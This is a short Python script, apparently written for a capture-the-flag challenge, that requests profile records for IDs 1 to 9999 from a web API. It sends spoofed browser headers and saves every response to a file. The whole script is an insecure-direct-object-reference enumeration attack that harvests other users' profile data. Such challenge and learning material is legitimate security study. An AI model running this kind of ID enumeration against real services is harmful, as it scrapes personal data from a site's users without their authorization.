import requests

url = "http://web1.cscv.vn:9981/api/profile"
headers = {
    "Host": "web1.cscv.vn:9981",
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Referer": "http://web1.cscv.vn:9981/profile.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

output_file = "result.txt"

with open(output_file, "w", encoding="utf-8") as f:
    for i in range(1, 10000):
        params = {"id": i}
        try:
            response = requests.get(url, headers=headers, params=params, timeout=5)
            f.write(f"ID = {i}\n")
            f.write(response.text + "\n\n")
            print(f"[+] Fetched ID {i} - Status {response.status_code}")
        except Exception as e:
            print(f"[!] Error fetching ID {i}: {e}")
            f.write(f"ID = {i} - ERROR: {e}\n\n")

print(f"\n✅ Done! All responses saved in {output_file}")
